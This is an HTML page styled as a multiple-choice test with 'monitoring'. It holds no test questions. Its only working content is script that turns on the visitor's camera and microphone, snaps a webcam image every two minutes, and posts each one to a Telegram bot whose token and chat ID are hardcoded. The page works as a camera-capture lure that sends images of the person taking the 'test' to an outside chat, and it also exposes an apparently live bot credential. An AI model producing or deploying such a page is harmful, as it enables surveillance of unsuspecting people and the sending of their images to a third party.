<html>
<head>
  <title>MCQ with Screenshot to Telegram</title>
  <style>
    body {
      background: #222;
      color: #fff;
      text-align: center;
      font-family: Arial;
      padding: 40px;
    }
    video {
      width: 300px;
      border: 4px solid #fff;
      border-radius: 10px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h1>MCQ Test with Monitoring</h1>
  <p>Camera and mic access required. Monitoring active.</p>
  <video id="video" autoplay muted playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const context = canvas.getContext("2d");

    const TELEGRAM_BOT_TOKEN = '7587653803:AAH6KKtv86RP8EB2zFHLgxwFmfK28eytULQ'; // replace
    const TELEGRAM_CHAT_ID = '7434840413';     // replace

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        video.srcObject = stream;
        setInterval(takeScreenshotAndSend, 2 * 60 * 1000); // every 2 minutes
      } catch (err) {
        alert("Camera/Mic permission required.");
      }
    }

    function takeScreenshotAndSend() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(sendToTelegram, 'image/png');
    }

    function sendToTelegram(blob) {
      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('photo', blob, 'screenshot.png');

      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      }).then(res => {
        console.log('Screenshot sent to Telegram.');
      }).catch(err => {
        console.error('Telegram upload failed', err);
      });
    }

    startCamera();
  </script>
</body>
</html>
